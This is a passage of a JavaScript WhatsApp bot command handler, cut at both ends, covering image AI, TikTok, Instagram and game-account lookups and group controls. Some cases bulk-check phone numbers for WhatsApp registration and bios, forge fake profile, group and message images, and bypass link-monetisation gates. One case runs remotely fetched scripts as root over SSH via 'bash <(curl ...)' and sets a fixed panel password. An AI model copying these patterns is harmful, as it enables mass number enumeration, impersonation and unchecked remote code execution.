            image: Buffer.from(response.data),
            caption: "✅ Berhasil membuat Figure."
          },
          { quoted: m }
        )
      }

      let json = {}
      try {
        json = JSON.parse(Buffer.from(response.data).toString())
      } catch { }

      if (!json.status) {
        return xreply(`❌ ${json.error || "Gagal memproses gambar."}`)
      }

      let hasil =
        json.result ||
        json.result_url ||
        json.url ||
        json.image ||
        json.output ||
        json.data?.url ||
        json.data?.result

      if (!hasil) {
        return xreply("❌ URL hasil tidak ditemukan.")
      }

      await client.sendMessage(
        m.chat,
        {
          image: { url: hasil },
          caption: "✅ Berhasil membuat Figure."
        },
        { quoted: m }
      )

    } catch (e) {
      console.log(e.response?.data || e)
      xreply(`❌ Error\n${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖶𝗂𝗇𝗄 𝖠𝖨 ] ──────────── ///
  case "wink": {
    try {
      if (!text) {
        return xreply(`Contoh:

.wink hd

Reply foto lalu ketik mode.

Mode:
• hd`)
      }

      if (!/image/.test(mime)) {
        return xreply("Reply foto dengan caption .wink hd")
      }

      await xreply("⏳ Sedang mengupload gambar...")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      const { ImageUploadService } = require('node-upload-images')
      const service = new ImageUploadService('pixhost.to')

      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        'rafaofficial.png'
      )

      fs.unlinkSync(media)

      await xreply("🎨 Sedang memproses dengan Wink AI...")

      const axios = require("axios")

      let api = `https://api.azbry.com/api/tools/wink?url=${encodeURIComponent(directLink)}&mode=${encodeURIComponent(text.trim())}`

      let { data } = await axios.get(api)

      if (!data.status) {
        return xreply("❌ Gagal memproses gambar")
      }

      let hasil = data.result.result_url

      await client.sendMessage(
        m.chat,
        {
          image: { url: hasil },
          caption: `✨ *Wink AI Editor*

📌 Mode : ${data.result.mode}
🖼️ Input : Reply Foto

✅ Berhasil diproses`
        },
        { quoted: m }
      )

    } catch (e) {
      console.log(e)
      xreply(`❌ Error:\n${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖳𝗂𝗄𝖳𝗈𝗄 𝖯𝗁𝗈𝗍𝗈 ] ──────────── ///
  case "ttphoto": {
    if (!text) {
      return xreply(
        "❌ Masukkan kata kunci pencarian.\n\n" +
        `Contoh:\n${prefix}tiktokphoto anime kece`
      )
    }

    try {
      const axios = require("axios")

      await xreply("🔎 Sedang mencari foto TikTok...")

      const apiUrl =
        "https://api.nexray.eu.cc/search/tiktokphoto?q=" +
        encodeURIComponent(text)

      const response = await axios.get(apiUrl, {
        timeout: 60000
      })

      const data = response.data

      console.log("[TIKTOKPHOTO RESPONSE]", data)

      if (!data) {
        return xreply("❌ API tidak memberikan response.")
      }

      const results =
        Array.isArray(data?.result) ? data.result :
          Array.isArray(data?.results) ? data.results :
            Array.isArray(data?.data) ? data.data :
              Array.isArray(data?.data?.result) ? data.data.result :
                Array.isArray(data?.data?.results) ? data.data.results :
                  []

      if (!results.length) {
        return xreply(
          "❌ Foto tidak ditemukan untuk pencarian:\n" +
          `"${text}"`
        )
      }

      const imageUrls = results
        .map(item => {
          if (typeof item === "string") return item

          return (
            item?.url ||
            item?.image ||
            item?.imageUrl ||
            item?.photo ||
            item?.download ||
            item?.downloadUrl ||
            item?.cover
          )
        })
        .filter(url =>
          typeof url === "string" &&
          /^https?:\/\//i.test(url)
        )

      if (!imageUrls.length) {
        return xreply(
          "❌ Hasil API ditemukan, tetapi URL fotonya tidak ditemukan.\n\n" +
          "Response API:\n" +
          JSON.stringify(data, null, 2).slice(0, 4000)
        )
      }

      const photos = imageUrls.slice(0, 10)

      await xreply(
        `✅ Ditemukan ${imageUrls.length} foto.\n` +
        `📸 Mengirim ${photos.length} hasil pertama...`
      )

      for (let i = 0; i < photos.length; i++) {
        try {
          await client.sendMessage(
            m.chat,
            {
              image: {
                url: photos[i]
              },
              caption:
                `📸 *TIKTOK PHOTO*\n\n` +
                `🔎 Query: ${text}\n` +
                `📌 Hasil: ${i + 1}/${photos.length}`
            },
            {
              quoted: m
            }
          )
        } catch (err) {
          console.error(
            `[TIKTOKPHOTO IMAGE ${i + 1}]`,
            err
          )
        }
      }

    } catch (e) {
      console.error("[TIKTOKPHOTO ERROR]", e)

      return xreply(
        "❌ Gagal mencari TikTok Photo.\n\n" +
        "Error: " +
        (
          e?.response?.data?.message ||
          e?.response?.data?.error ||
          e?.message ||
          e
        )
      )
    }
  }
  break

  /// ───────────── [ 𝖦𝖾𝗆𝗂𝗇𝗂 𝖳𝖳𝖲 ] ──────────── ///
  case "geminitts": {
    if (!text) {
      return xreply(
        "❌ Masukkan teks yang ingin diubah menjadi suara.\n\n" +
        `Contoh:\n${prefix}geminitts halo apa kabar`
      )
    }

    try {
      const axios = require("axios")

      await xreply("⏳ Sedang membuat suara...")

      const apiUrl =
        "https://api.nexray.eu.cc/ai/gemini-tts?text=" +
        encodeURIComponent(text)

      const response = await axios.get(apiUrl, {
        timeout: 120000
      })

      const data = response.data

      if (!data?.status || !data?.result) {
        console.log("[GEMINI TTS RESPONSE]", data)

        return xreply(
          "❌ API tidak mengembalikan audio yang valid."
        )
      }

      const audioUrl = data.result

      await client.sendMessage(
        m.chat,
        {
          audio: {
            url: audioUrl
          },
          mimetype: "audio/mpeg",
          ptt: false
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.error("[GEMINI TTS ERROR]", e)

      return xreply(
        "❌ Gagal membuat suara.\n\n" +
        "Error: " +
        (
          e?.response?.data?.message ||
          e?.response?.data?.error ||
          e?.message ||
          e
        )
      )
    }
  }
  break

  /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖭𝗈𝗄𝗂𝖺 ] ──────────── ///
  case 'pakeko': {
    try {
      if (!text) {
        return xreply(
          `Contoh:\n.fakenokia jatuh cinta boleh alasan jangan just friend`
        )
      }

      const { createCanvas, loadImage } = require('canvas')
      const fs = require('fs')
      const path = require('path')
      const https = require('https')
      const http = require('http')

      const BG_URL = 'https://img3.pixhost.to/images/5090/760870690_rafaofficial.jpg'
      const BG_PATH = path.join(__dirname, 'assets', 'nokia_bg.jpg')

      fs.mkdirSync(path.join(__dirname, 'assets'), { recursive: true })

      const downloadFile = (url, dest) => new Promise((resolve, reject) => {
        if (fs.existsSync(dest)) return resolve()
        const file = fs.createWriteStream(dest)
        const client = url.startsWith('https') ? https : http
        client.get(url, (res) => {
          if (res.statusCode !== 200) {
            fs.unlink(dest, () => { })
            return reject(new Error(`HTTP ${res.statusCode}`))
          }
          res.pipe(file)
          file.on('finish', () => file.close(resolve))
        }).on('error', (err) => {
          fs.unlink(dest, () => { })
          reject(err)
        })
      })

      await downloadFile(BG_URL, BG_PATH)

      const pesan = text.trim()

      const bg = await loadImage(BG_PATH)
      const W = bg.width
      const H = bg.height

      const canvas = createCanvas(W, H)
      const ctx = canvas.getContext('2d')
      ctx.drawImage(bg, 0, 0, W, H)

      function wrapLine(ctx, text, maxWidth) {
        const words = text.split(' ')
        const wrapped = []
        let current = ''
        for (const word of words) {
          const test = current ? current + ' ' + word : word
          if (ctx.measureText(test).width > maxWidth && current) {
            wrapped.push(current)
            current = word
          } else {
            current = test
          }
        }
        if (current) wrapped.push(current)
        return wrapped.length ? wrapped : [text]
      }

      const BOX_X = W * 0.083
      const BOX_Y = H * 0.340
      const BOX_W = W * 0.850
      const BOX_H = H * 0.250

      const FIXED_FONT = Math.floor(H * 0.045)
      const MIN_FONT = 14

      let fontSize = FIXED_FONT
      let wrappedLines = []

      ctx.textAlign = 'left'
      ctx.textBaseline = 'top'
      ctx.fillStyle = '#111111'

      while (fontSize >= MIN_FONT) {
        ctx.font = `bold ${fontSize}px Arial`
        wrappedLines = wrapLine(ctx, pesan, BOX_W)
        const lineH = fontSize * 1.30
        const totalH = wrappedLines.length * lineH
        if (totalH <= BOX_H) break
        fontSize -= 2
      }

      const lineHeight = fontSize * 1.30
      const startY = BOX_Y + (BOX_H - (wrappedLines.length * lineHeight)) / 2

      ctx.save()
      ctx.beginPath()
      ctx.rect(BOX_X, BOX_Y, BOX_W, BOX_H)
      ctx.clip()

      ctx.font = `bold ${fontSize}px Arial`
      wrappedLines.forEach((line, i) => {
        const y = startY + (i * lineHeight)
        if (y > BOX_Y + BOX_H - lineHeight) return
        ctx.fillText(line, BOX_X, y)
      })
      ctx.restore()

      const buffer = canvas.toBuffer('image/jpeg', { quality: 0.95 })

      await client.sendMessage(
        m.chat,
        {
          image: buffer,
          caption: '📱 Fake Nokia Message'
        },
        { quoted: m }
      )

    } catch (e) {
      console.log(e)
      xreply('❌ Error fakenokia')
    }
  }
  break

  /// ───────────── [ 𝖦𝗋𝗈𝗎𝗉 𝖢𝗈𝗇𝗍𝗋𝗈𝗅 ] ──────────── ///
  case 'open':
  case 'buka': {
    if (!isOwner) return reply(mess.owner)
    if (!m.isGroup) return reply(mess.group)
    client.groupSettingUpdate(m.chat, 'not_announcement')
    reply('Grup berhasil dibuka')
  }
  break

  case 'close':
  case 'tutup': {
    if (!isOwner) return reply(mess.owner)
    if (!m.isGroup) return reply(mess.group)
    client.groupSettingUpdate(m.chat, 'announcement')
    reply('Grup berhasil ditutup')
  }
  break;

  /// ───────────── [ 𝖬𝗈𝖻𝗂𝗅𝖾 𝖫𝖾𝗀𝖾𝗇𝖽𝗌 𝖲𝗍𝖺𝗅𝗄𝖾𝗋 ] ──────────── ///
  case 'mlstalk':
  case 'cekml':
  case 'stalkml': {
    try {
      if (!text) {
        return xreply(`*Format Penggunaan :*

${prefix + command} 541247863|8179

*Contoh :*
${prefix + command} 541247863|8179`)
      }

      let [userid, zoneid] = text.split("|")

      if (!userid || !zoneid) {
        return xreply(`❌ Format salah!

Contoh:
${prefix + command} 541247863|8179`)
      }

      Reply("⏳ Sedang mengambil data akun Mobile Legends...")

      const axios = require("axios")

      const api = `https://bintangapi.my.id/api/stalker/ml?user_id=${encodeURIComponent(userid.trim())}&zone_id=${encodeURIComponent(zoneid.trim())}`

      const { data } = await axios.get(api)

      if (!data.success) {
        return xreply("❌ ID atau Zone ID tidak ditemukan.")
      }

      const res = data.data

      let teks = `乂 *MOBILE LEGENDS STALK*

╭━━━〔 🎮 ACCOUNT INFO 〕━━⬣
┃ 👤 Nickname : ${res.nickname}
┃ 🆔 User ID : ${res.user_id}
┃ 🌐 Zone ID : ${res.zone_id}
┃ 🌍 Region : ${res.region}
╰━━━━━━━━━━━━━━━━⬣

> Powered By MISTER-MD`

      await client.sendMessage(
        m.chat,
        {
          text: teks
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log(e)
      xreply(`❌ Gagal mengambil data!\n\n${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖳𝗂𝗄𝖳𝗈𝗄 𝖤𝖺𝗋𝗇𝗂𝗇𝗀𝗌 ] ──────────── ///
  case 'ttstalk':
  case "tiktokearnings": {
    try {
      const username = text?.trim()

      if (!username) {
        return xreply(
          example("mrbeast")
        )
      }

      await xreply("⏳ Sedang mengambil data TikTok...")

      const apiUrl =
        "https://api.nexray.eu.cc/tools/tiktokearnings?username=" +
        encodeURIComponent(username)

      const response = await axios.get(apiUrl, {
        timeout: 60000
      })

      const data = response.data

      console.log(
        "TIKTOK EARNINGS RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !data?.result) {
        return xreply(
          "❌ Data TikTok tidak ditemukan."
        )
      }

      const result = data.result

      const followers = Number(result.followers || 0)
      const likes = Number(result.average_likes || 0)
      const earnings = Number(result.earnings || 0)
      const engagement = Number(result.engagement || 0)

      const formatNumber = (num) => {
        return new Intl.NumberFormat("id-ID").format(num)
      }

      const formatMoney = (num) => {
        return new Intl.NumberFormat("en-US", {
          style: "currency",
          currency: "USD"
        }).format(num)
      }

      const teks =
        `🎵 *TIKTOK EARNINGS*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `👤 Name: *${result.name || username}*\n` +
        `🔗 Username: *@${username.replace(/^@/, "")}*\n\n` +
        `👥 Followers: *${formatNumber(followers)}*\n` +
        `❤️ Average Likes: *${formatNumber(likes)}*\n` +
        `📹 Posts: *${formatNumber(Number(result.posts || 0))}*\n` +
        `💰 Estimated Earnings: *${formatMoney(earnings)}*\n` +
        `📈 Engagement: *${engagement}%*\n\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🤖 Source: MISTER-MD`

      await xreply(teks)

    } catch (err) {
      console.error(
        "TIKTOK EARNINGS ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal mengambil data TikTok.\n" +
        "Pastikan username benar atau API sedang bermasalah."
      )
    }
  }
  break

  /// ───────────── [ 𝖡𝗒𝗉𝖺𝗌𝗌 𝖴𝖱𝖫 ] ──────────── ///
  case "bypassurl":
  case "bypass2":
  case "bypasslink": {
    try {
      if (!text) {
        return reply(`Contoh penggunaan:

${prefix + command} https://linkvertise.com/access/1239053/55d5Jdz1eY7h`);
      }

      if (!/^https?:\/\//i.test(text)) {
        return reply("❌ Masukkan URL yang valid.");
      }

      Reply("⏳ Sedang membypass URL...");

      const axios = require("axios");

      const api = `https://bintangapi.my.id/api/tools/bypassurl2?url=${encodeURIComponent(text)}`;

      const { data } = await axios.get(api, {
        timeout: 60000
      });

      if (!data?.success) {
        return reply("❌ Gagal membypass URL.");
      }

      const result = data.data?.result || "-";
      const original = data.data?.url || text;

      let hasil = `*✅ BYPASS URL BERHASIL*

🔗 *URL Asli :*
${original}

📂 *Hasil Bypass :*
${result}

> Powered By MISTER-MD`;

      await client.sendMessage(m.chat, {
        text: hasil
      }, {
        quoted: m
      });

    } catch (e) {
      console.log(e);

      Reply(`❌ Gagal membypass URL.

${e.response?.data?.message || e.message}`);

    }
  }
  break;

  case 'skiplink': {
    if (!text) return xreply(`Contoh : .skiplink https://sub4unlock.co/S9oU0`);
    xreply('wett')
    try {
      let api = `https://fgsi.koyeb.app/api/tools/skip/sub4unlock?apikey=APIKEY&url=${encodeURIComponent(text)}`;
      let { data: json } = await axios.get(api);

      if (!json.status || !json.data?.linkGo) {
        return xreply('Lu masukin url apa tu woy 😂');
      }

      await xreply(`${json.data.linkGo}`);
    } catch (err) {
      xreply(`Eror kak : ${err.message}`)
    }
  };
  break

  case 'subs4unlock': {
    if (!text) {
      return xreply(`Masukkan URL subs4unlock!\nContoh: ${prefix + command} https://subs4unlock.id/xxxxx`);
    }

    try {
      await xreply("⏳ Memproses...");

      const apiUrl = `https://api.theresav.biz.id/bypass/subs4unlock?url=${encodeURIComponent(text)}&apikey=SurGG`;

      const res = await fetch(apiUrl);
      const data = await res.json();

      if (data.status || data.result) {
        let message = `[ SUBS4UNLOCK BYPASS ]\n\n`;
        message += `Input URL: ${data.input || text}\n`;
        message += `Result URL: ${data.result}\n`;
        message += `Method: ${data.method || "Theresa API"}`;

        xreply(message);
      } else {
        xreply(`Gagal bypass URL.`);
      }

    } catch (error) {
      console.error(error);
      xreply(`Terjadi kesalahan:\n${error.message}`);
    }
  };
  break

  /// ───────────── [ 𝖢𝖾𝗄 𝖡𝗂𝗈 𝖭𝗈𝗆𝗈𝗋 ] ──────────── ///
  case "cekbio2": {
    try {
      if (!text) return reply(`Contoh:\n${prefix + command} 62812xxxx,62813xxxx`);

      let input = text
        .replace(/\n/g, ",")
        .replace(/\s/g, "");

      let numbers = input.split(",").filter(v => v);

      if (numbers.length < 1) return reply("Masukkan minimal 1 nomor.");

      Reply(`⏳ Sedang mengecek ${numbers.length} nomor...`);

      let withBio = [];
      let noBio = [];
      let notReg = [];

      const batchSize = 15;

      for (let i = 0; i < numbers.length; i += batchSize) {
        const batch = numbers.slice(i, i + batchSize);

        await Promise.allSettled(batch.map(async (nomor) => {
          let jid = nomor.replace(/\D/g, "") + "@s.whatsapp.net";

          try {
            const check = await client.onWhatsApp(jid);

            if (!check || !check[0]?.exists) {
              notReg.push(nomor);
              return;
            }

            try {
              const status = await client.fetchStatus(jid);

              if (status && status.status && status.status.trim() !== "") {
                withBio.push({
                  nomor,
                  bio: status.status,
                  setAt: status.setAt || "-"
                });
              } else {
                noBio.push(nomor);
              }
            } catch {
              noBio.push(nomor);
            }
          } catch {
            notReg.push(nomor);
          }
        }));

        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      let hasil = `*HASIL CEK BIO*\n\n`;
      hasil += `✅ Total Dicek : ${numbers.length}\n`;
      hasil += `📝 Dengan Bio : ${withBio.length}\n`;
      hasil += `📵 Tanpa Bio / Privasi : ${noBio.length}\n\n`;

      if (withBio.length) {
        hasil += `*──── DENGAN BIO (${withBio.length}) ────*\n\n`;

        for (let x of withBio) {
          let waktu = "-";

          if (x.setAt && x.setAt !== "-") {
            let d = new Date(x.setAt);

            if (!isNaN(d)) {
              waktu = d.toLocaleString("id-ID");
            }
          }

          hasil += `📱 ${x.nomor}\n`;
          hasil += `📝 ${x.bio}\n`;
          hasil += `⏰ ${waktu}\n\n`;
        }
      } else {
        hasil += "*──── DENGAN BIO ────*\n(Kosong)\n\n";
      }

      hasil += `*──── TANPA BIO / PRIVASI (${noBio.length}) ────*\n`;

      if (noBio.length) {
        hasil += noBio.join("\n");
      } else {
        hasil += "(Kosong)";
      }

      await Reply(hasil);

      let hasil2 = `*DATA NOMOR TIDAK TERDAFTAR*\n\n`;
      hasil2 += `🚫 Total : ${notReg.length}\n\n`;

      if (notReg.length) {
        hasil2 += notReg.join("\n");
      } else {
        hasil2 += "(Kosong)";
      }

      await Reply(hasil2);

    } catch (e) {
      console.log(e);
      Reply("Terjadi kesalahan saat mengecek bio.");
    }
  }
  break;

  case "cekbio": {
    try {
      if (!text) return reply(`Contoh:\n${prefix + command} 62812xxxx,62813xxxx`);

      let input = text
        .replace(/\n/g, ",")
        .replace(/\s/g, "");

      let numbers = input.split(",").filter(v => v);

      if (numbers.length < 1) return reply("Masukkan minimal 1 nomor.");

      Reply(`⏳ Sedang mengecek ${numbers.length} nomor...`);

      let withBio = [];
      let noBio = [];
      let notReg = [];

      const batchSize = 15;

      for (let i = 0; i < numbers.length; i += batchSize) {
        const batch = numbers.slice(i, i + batchSize);

        await Promise.allSettled(batch.map(async (nomor) => {
          let jid = nomor.replace(/\D/g, "") + "@s.whatsapp.net";

          try {
            const check = await client.onWhatsApp(jid);

            if (!check || !check[0]?.exists) {
              notReg.push(nomor);
              return;
            }

            try {
              const status = await client.fetchStatus(jid);

              if (status && status.status && status.status.trim() !== "") {
                withBio.push({
                  nomor,
                  bio: status.status,
                  setAt: status.setAt || "-"
                });
              } else {
                noBio.push(nomor);
              }
            } catch {
              noBio.push(nomor);
            }
          } catch {
            notReg.push(nomor);
          }
        }));

        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      let hasil = `*HASIL CEK BIO*\n\n`;
      hasil += `✅ Total : ${numbers.length}\n`;
      hasil += `📝 Dengan Bio : ${withBio.length}\n`;
      hasil += `📵 Tanpa Bio : ${noBio.length}\n`;
      hasil += `🚫 Tidak Terdaftar : ${notReg.length}\n\n`;

      if (withBio.length) {
        hasil += "*── DENGAN BIO ──*\n\n";

        for (let x of withBio) {
          let waktu = "-";

          if (x.setAt && x.setAt !== "-") {
            let d = new Date(x.setAt);

            if (!isNaN(d)) {
              waktu = d.toLocaleString("id-ID");
            }
          }

          hasil += `📱 ${x.nomor}\n`;
          hasil += `📝 ${x.bio}\n`;
          hasil += `⏰ ${waktu}\n\n`;
        }
      }

      if (noBio.length) {
        hasil += "*── TANPA BIO ──*\n";
        hasil += noBio.join("\n");
        hasil += "\n\n";
      }

      if (notReg.length) {
        hasil += "*── TIDAK TERDAFTAR ──*\n";
        hasil += notReg.join("\n");
      }

      Reply(hasil);

    } catch (e) {
      console.log(e);
      Reply("Terjadi kesalahan saat mengecek bio.");
    }
  }
  break;

  case 'cekbio3': {
    if (!q) return reply(`*Syntax Error*\nExample:\n${command} 628xxxx`);

    let nomor = q.replace(/[^0-9]/g, '');
    const jid = nomor + '@s.whatsapp.net';

    try {
      const result = await client.fetchStatus(jid);

      if (!result || !result.status) {
        return client.sendMessage(m.chat, { text: `❌ Bio tidak ditemukan / User tidak memiliki bio` }, { quoted: m });
      }

      const waktu = result.setAt
        ? new Date(result.setAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
        : '-';

      const teks = `
*Cek Bio Ny MISTER-MD*
- Nomor: +${nomor}
- Bio: ${result.status}
- Update Bio: ${waktu}

© Copyright By MISTER-MD`;

      await client.sendMessage(m.chat, { text: teks }, { quoted: qloc });

    } catch (e) {
      await client.sendMessage(m.chat, { text: `❌ Gagal mengambil bio.\nError: ${e}` }, { quoted: qloc });
    }
  }
  break;

  /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖯𝗋𝗈𝖿𝗂𝗅𝖾 ] ──────────── ///
  case 'fakeprofil': {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    if (!/image/.test(mime)) return xreply('Silakan reply foto untuk dijadikan foto profil!');

    if (!text) return xreply('Format salah!\nContoh: *fakeprofil MISTER-MD|+628xxx|MISTER-MD*');
    let [username, nomor, bio] = text.split('|');
    if (!username || !nomor || !bio) return xreply('Format harus menggunakan pemisah |\nContoh: *Nama|Nomor|Bio*');

    await xreply('Sedang memproses, mohon tunggu...');

    try {
      const { createCanvas, loadImage } = require('@napi-rs/canvas');

      const bgUrl = 'https://img2.pixhost.to/images/9139/747073049_rafaofficial.jpg';
      const background = await loadImage(bgUrl);

      const canvas = createCanvas(1125, 2436);
      const ctx = canvas.getContext('2d');

      ctx.drawImage(background, 0, 0, 1125, 2436);

      let imgBuffer = await q.download();
      const profileImg = await loadImage(imgBuffer);

      const avatarX = 562.5;
      const avatarY = 450;
      const radius = 172;

      ctx.save();
      ctx.beginPath();
      ctx.arc(avatarX, avatarY, radius, 0, Math.PI * 2, true);
      ctx.closePath();
      ctx.clip();

      ctx.drawImage(profileImg, avatarX - radius, avatarY - radius, radius * 2, radius * 2);
      ctx.restore();

      ctx.textBaseline = 'middle';

      ctx.textAlign = 'center';
      ctx.font = 'bold 74px Arial, sans-serif';
      ctx.fillStyle = '#FFFFFF';
      ctx.fillText(username.trim(), 562.5, 680);

      ctx.font = '500 44px Arial, sans-serif';
      ctx.fillStyle = '#8E8E93';
      ctx.fillText(nomor.trim(), 562.5, 775);

      ctx.textAlign = 'left';
      ctx.font = '44px Arial, sans-serif';
      ctx.fillStyle = '#FFFFFF';

      ctx.fillText(bio.trim(), 95, 1160);

      let buffer = canvas.toBuffer('image/jpeg');
      await client.sendMessage(m.chat, { image: buffer, caption: `*Fake Profile Selesai!*` }, { quoted: m });

    } catch (err) {
      console.error(err);
      xreply('Terjadi kesalahan pada sistem Canvas.');
    }
  }
  break;

  /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖦𝗋𝗈𝗎𝗉 ] ──────────── ///
  case 'fakegrup': {
    try {
      if (!/image/.test(mime)) return xreply(example("MISTER-MD|500 dengan kirim/reply foto"))
      if (!text) return xreply(example("MISTER-MD|500"))

      let [nama, peserta] = text.split("|")

      if (!nama || !peserta) {
        return xreply(`Format salah!\n\nContoh:\n${prefix + command} MISTER-MD|500`)
      }

      await xreply("⏳ Sedang membuat Fake Group...")

      const media = await client.downloadAndSaveMediaMessage(qmsg)

      const { ImageUploadService } = require('node-upload-images')
      const service = new ImageUploadService('pixhost.to')

      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        'MISTER-MD-md.jpg'
      )

      const profile = directLink.toString()

      const api = `https://api.azbry.com/api/maker/igc?profile=${encodeURIComponent(profile)}&nama=${encodeURIComponent(nama)}&peserta=${encodeURIComponent(peserta)}`

      await client.sendMessage(m.chat, {
        image: {
          url: api
        },
        caption: `乂 *FAKE GROUP BERHASIL*

📛 *Nama Grup :* ${nama}
👥 *Jumlah Peserta :* ${peserta}

> Powered By MISTER-MD`
      }, {
        quoted: m
      })

      fs.unlinkSync(media)

    } catch (e) {
      console.log(e)
      xreply(`❌ Terjadi kesalahan!\n\n${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖨𝗇𝗌𝗍𝖺𝗀𝗋𝖺𝗆 𝖲𝗍𝖺𝗅𝗄𝖾𝗋 ] ──────────── ///
  case 'igstalk': {
    try {
      const axios = require('axios')

      if (!text) return xreply(`*Contoh Penggunaan :*\n${prefix + command} timothyronaldd`)

      await xreply('⏳ Sedang mengambil data Instagram...')

      const { data } = await axios.get(`https://api.synoxcloud.xyz/stalker/instagram?username=${encodeURIComponent(text)}`)

      if (!data.status) {
        return xreply('❌ Username tidak ditemukan atau gagal mengambil data.')
      }

      const meta = data.result.metadata || {}
      const user = data.result.stories?.data?.user || {}

      const caption = `
╭━━━〔 📸 INSTAGRAM STALK 〕━━⬣
┃ 👤 Username : ${user.username || text}
┃ 🏷️ Nama : ${user.full_name || '-'}
┃ 🆔 ID : ${user.id || '-'}
┃ 🌍 Negara : ${data.result.stories?.data?.country || '-'}
┃ ✔️ Verified : ${user.is_verified ? 'Ya' : 'Tidak'}
┃ 🔒 Private : ${user.is_private ? 'Ya' : 'Tidak'}
┃ 📂 Kategori : ${user.category_name || '-'}
┃ 💼 Business : ${user.business_category_name || '-'}
┃
┃ 📝 Bio :
┃ ${user.biography || '-'}
┃
┃ 👥 Followers : ${meta.followers || user.edge_followed_by || 0}
┃ ➕ Following : ${meta.following || user.edge_follow || 0}
┃ 🖼️ Postingan : ${meta.posts || user.edges_count || 0}
┃ 🔗 Website :
┃ ${user.external_url || '-'}
╰━━━━━━━━━━━━━━━━━━⬣

📦 *Postingan Terbaru:* ${user.edges?.length || 0}
`

      await client.sendMessage(m.chat, {
        image: {
          url: meta.avatar || user.profile_pic_url
        },
        caption
      }, {
        quoted: m
      })

      if (user.edges && user.edges.length > 0) {
        let teks = '📸 *Daftar Postingan Terbaru*\n\n'

        user.edges.slice(0, 10).forEach((v, i) => {
          const tanggal = v.taken_at
            ? new Date(v.taken_at * 1000).toLocaleString('id-ID')
            : '-'

          teks += `*${i + 1}. ${v.is_video ? '🎬 Video' : '🖼️ Foto'}*\n`
          teks += `❤️ Like : ${v.like_count || 0}\n`
          teks += `💬 Komentar : ${v.comment_count || 0}\n`
          teks += `📅 Upload : ${tanggal}\n`
          if (v.video_url) teks += `🎬 Video : ${v.video_url}\n`
          teks += `🖼️ Gambar : ${v.display_url}\n\n`
        })

        await xreply(teks)
      }

    } catch (e) {
      console.log(e)
      xreply(`❌ Terjadi kesalahan.\n\n${e.message}`)
    }
  }
  break
  
  /// ───────────── [ 𝖯𝗍𝖾𝗋𝗈𝖽𝖺𝖼𝗍𝗒𝗅 𝖨𝗇𝗌𝗍𝖺𝗅𝗅𝖾𝗋 ] ──────────── ///
  case "installpanel3": {
    if (!isOwner) return xreply(mess.owner)

    if (!q || !q.includes("|")) {
      return xreply(
        `*Format salah!*\n\n` +
        `*Contoh:*\n` +
        `${prefix + command} ipvps|pwvps|panel.com|node.com|ramserver\n\n` +
        `*Contoh lengkap:*\n` +
        `${prefix + command} 192.168.1.100|password123|panel.example.com|node.example.com|100000`
      )
    }

    const vii = q.split("|")

    if (vii.length < 5) {
      return xreply(
        `*Format Salah!*\n\n` +
        `*Contoh:*\n` +
        `${prefix + command} ipvps|pwvps|panel.com|node.com|ramserver`
      )
    }

    const ipHost = vii[0]?.trim() || ""
    const passwordVps = vii[1]?.trim() || ""
    const domainPanel = vii[2]?.trim() || ""
    const domainNode = vii[3]?.trim() || ""
    const ramServer = vii[4]?.trim() || ""

    if (!ipHost || !passwordVps || !domainPanel || !domainNode || !ramServer) {
      return xreply("❌ Semua parameter harus diisi!")
    }

    const cooldown = checkCooldown(m.sender, command, 1800000)
    if (!cooldown.allowed) {
      return xreply(`⏱️ Tunggu *${cooldown.remainingTime} detik* sebelum menggunakan command ini lagi.`)
    }
    recordUsage(m.sender, command, 1800000)

    const ssh2 = require("ssh2")
    const ress = new ssh2.Client()

    const connSettings = {
      host: ipHost,
      port: 22,
      username: "root",
      password: passwordVps,
      readyTimeout: 30000
    }

    const passwordPanel = "admin001"
    const commandPanel = "bash <(curl -s https://pterodactyl-installer.se)"

    const InstallNodes = async () => {
      return new Promise((resolve, reject) => {
        ress.exec(
          "bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)",
          { pty: true },
          (err, stream) => {
            if (err) return reject(err)

            stream
              .on("close", async (code) => {
                const successMsg =
                  `*Install Panel Telah Berhasil ✅*\n\n` +
                  `*Berikut Detail Akun Panel Kamu:*\n\n` +
                  `*👤 Username:* admin\n` +
                  `*🔐 Password:* ${passwordPanel}\n` +
                  `*🌐 URL:* https://${domainPanel}\n\n` +
                  `Silahkan setting allocation & ambil token node di node yang sudah dibuat oleh bot\n\n` +
                  `*Cara menjalankan wings:*\n` +
                  `${prefix}startwings ${ipHost}|${passwordVps}|tokennode`

                await client.sendMessage(m.chat, { text: successMsg }, { quoted: m })
                ress.end()
                resolve()
              })
              .on("data", (data) => {
                const out = data.toString()
                console.log("Node Install:", out)

                if (out.includes("Masukkan nama lokasi:")) stream.write("Singapore\n")
                else if (out.includes("Masukkan deskripsi lokasi:")) stream.write("Node By MISTER-MD\n")
                else if (out.includes("Masukkan domain:")) stream.write(`${domainNode}\n`)
                else if (out.includes("Masukkan nama node:")) stream.write("MISTER-MD Node\n")
                else if (out.includes("Masukkan RAM (dalam MB):")) stream.write(`${ramServer}\n`)
                else if (out.includes("Masukkan jumlah maksimum disk space (dalam MB):")) stream.write(`${ramServer}\n`)
                else if (out.includes("Masukkan Locid:")) stream.write("1\n")
              })
              .stderr.on("data", (data) => {
                console.error("Node Stderr:", data.toString())
              })
          }
        )
      })
    }

    const instalWings = async () => {
      return new Promise((resolve, reject) => {
        ress.exec(commandPanel, { pty: true }, (err, stream) => {
          if (err) {
